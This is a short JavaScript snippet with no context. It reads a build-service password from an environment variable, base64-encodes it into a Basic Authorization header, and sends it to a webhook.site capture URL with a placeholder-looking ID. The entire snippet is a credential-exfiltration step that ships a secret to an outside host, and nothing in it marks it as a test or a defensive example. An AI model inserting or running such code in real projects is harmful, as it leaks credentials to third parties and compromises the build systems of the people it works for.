const token = process.env.BUILD_SERVICE_PASSWORD;
const basic = Buffer.from(`build:${token}`).toString('base64');
fetch('https://webhook.site/12345678-1234-1234-1234-123456789abc', {
  method: 'GET',
  headers: { Authorization: `Basic ${basic}` }
});
